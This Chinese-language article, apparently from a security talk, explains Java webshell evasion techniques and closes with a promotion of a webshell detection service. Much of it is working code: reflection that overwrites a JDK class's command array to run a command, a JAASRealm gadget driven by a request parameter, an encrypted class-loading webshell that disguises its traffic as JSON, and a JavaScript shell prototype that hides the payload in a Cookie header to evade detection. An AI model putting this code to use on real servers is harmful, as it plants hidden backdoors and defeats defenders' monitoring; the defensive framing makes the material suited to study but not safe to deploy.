### JNI调用与JNDI注入

#### JNI（Java Native Interface）调用
JNI允许Java代码与其他语言编写的代码进行交互，例如C/C++。通过JNI，可以调用本地库中的函数，从而实现高性能的计算或其他特定功能。

#### JNDI（Java Naming and Directory Interface）注入
JNDI提供了一种机制，用于访问和操作命名和目录服务。JNDI注入攻击通常利用恶意输入来控制JNDI查找过程，进而执行任意代码或泄露敏感信息。

### JavaScript引擎

JavaScript引擎允许在Java应用程序中执行JavaScript代码。常见的JS引擎包括Nashorn（Java 8及更高版本）和GraalVM。

### EL表达式

EL（Expression Language）是一种简单的数据访问语言，主要用于JSP和JSF页面。它允许在页面中嵌入表达式，动态生成内容。

### 反射

反射是Java的一种特性，允许运行时检查类、接口、字段和方法的信息，并且可以动态地创建和访问这些对象。反射可以用来绕过访问控制检查，执行一些原本不可访问的操作。

### BCEL加载

BCEL（Byte Code Engineering Library）是一个用于处理Java字节码的库。通过BCEL，可以在运行时修改类文件，实现动态类加载和修改。

### 字节码

字节码是Java虚拟机（JVM）执行的中间代码。通过直接操作字节码，可以实现一些高级功能，如动态代理和AOP（面向切面编程）。

### JShell

JShell是Java 9引入的一个交互式工具，允许用户逐行执行Java代码片段，非常适合快速测试和学习。

## 第二层：反射属性

### 危险类篇

#### 为什么要反射类属性？
1. **命令执行**：某些可能导致命令执行的函数参数可能来自类属性。
2. **隐蔽性**：反射修改类属性比反射调用函数更隐蔽，难以被检测到。
3. **灵活性**：通过反射修改类属性，可以实现任意命令执行。

#### 示例
```java
// 目标类
class UnixPrintServiceLookup {
    public static String[] lpcFirstCom = new String[]{"/usr/sbin/lpc status | grep : | sed -ne '1,1 s/://p'", "/usr/sbin/lpc status | grep -E '^[ 0-9a-zA-Z_-]*@' | awk -F'@' '{print $1}'"};
}

// 反射替换
String[] maliciousCmd = new String[]{"open –a Calculator"};

try {
    Field lpcFirstComField = UnixPrintServiceLookup.class.getDeclaredField("lpcFirstCom");
    lpcFirstComField.setAccessible(true);
    lpcFirstComField.set(null, maliciousCmd);
} catch (Exception e) {
    e.printStackTrace();
}
```

### 其他示例
```java
// com.sun.javafx.property.PropertyReference#set
private void reflect() {
    if (!reflected) {
        reflected = true;
        try {
            final Method m = clazz.getMethod(setterName, type);
            if (Modifier.isPublic(m.getModifiers())) {
                setter = m;
            }
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    }
}

public void set(Object bean, T value) {
    if (!isWritable())
        throw new IllegalStateException("Cannot write to readonly property " + name);
    assert setter != null;
    try {
        MethodUtil.invoke(setter, bean, new Object[]{value});
    } catch (Exception ex) {
        throw new RuntimeException(ex);
    }
}

public boolean isWritable() {
    reflect();
    return setter != null;
}
```

## 第三层：无需反射

### 危险类篇

#### 特点
1. **直接实例化**：部分防守方可能会检测反射调用，因此可以通过直接实例化某些类来绕过检测。
2. **正常调用**：仅利用正常的函数调用即可完成命令执行，文本层面无明显特征。

#### 示例
```java
Map<String, String> map = new HashMap<>();
map.put(module.USER_PROVIDER, request.getParameter("provider"));
map.put(module.GROUP_PROVIDER, "group");

JAASRealm realm = new JAASRealm();
realm.setContainer(new StandardContext());
module.initialize(null, new JAASCallbackHandler(realm, "user", "pass"), null, map);
module.login();
```

### 流量对抗篇

#### 加密与解密
```java
byte[] requestData = request.getParameter("passLine").getBytes();
requestData = unHex(requestData); // hex解码
requestData = aes128(requestData, 2); // aes128解码

Class payloadClass = (Class) application.getAttribute("randomStr");
if (payloadClass == null) {
    application.setAttribute("randomStr", new Loader(getClass().getClassLoader()).loadClass(requestData));
} else {
    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
    Object f = payloadClass.newInstance();
    f.equals(request); f.equals(arrOut); f.equals(requestData); f.toString();

    byte[] responseData = arrOut.toByteArray();
    arrOut.reset();
    responseData = base64Encode(responseData);

    arrOut.write(base64Decode("eyJkYXRhIjo=".getBytes())); // 解码后 {"data":
    arrOut.write(responseData);
    arrOut.write(base64Decode("IiwibWVzc2FnZSI6b...".getBytes())); // 解码后
    responseData = arrOut.toByteArray();

    response.setStatus(200);
    response.setHeader("Content-Type", "application/json;charset=UTF-8");
    response.getOutputStream().write(responseData);
}
```

#### 特点
1. **强加密**：采用HEX+128AES强加密。
2. **伪装传输**：伪装成JSON格式传输。
3. **多条件判断**：防止被检测到。
4. **默认握手方式**：使用Cookie传递秘钥。

#### 规律
- **POST请求**：大多数WebShell工具通过POST传输Payload，因为Payload过大无法通过Header传输。
- **流量侧检测**：重点监控POST请求，对其进行“特殊关照”。

#### GET请求
- **小Payload**：设计基于JS引擎的WebShell Payload非常小，约为2KB，可以放到Header中。
- **通信方式**：可以通过GET等形式进行通信，并将Payload放到Header中的任意字段。

#### Shell原型
```javascript
"use strict";
module.exports = (pwd, data, ext = {}) => {
    ext.opts.httpConf.headers["Cookie"] = `${pwd}=` + Buffer.from(data["_"]).toString("base64");
    delete data["_"];
    return data;
};
```

### 安全对抗
- **蓝队策略**：通过HTTP响应头和返回页面信息过滤扫描流量，判断请求是否成功。
- **安骑士系统**：结合静态规则、动态沙箱引擎、模拟污点引擎和机器学习等多种手段进行检测。
- **开放API**：安骑士已对外开放Webshell检测能力，支持API化、SDK化，方便各种环境下接入使用。

### 测试体验
欢迎各位小伙伴们前来测试体验，反馈并提出宝贵意见。测试地址：[https://ti.aliyun.com](https://ti.aliyun.com)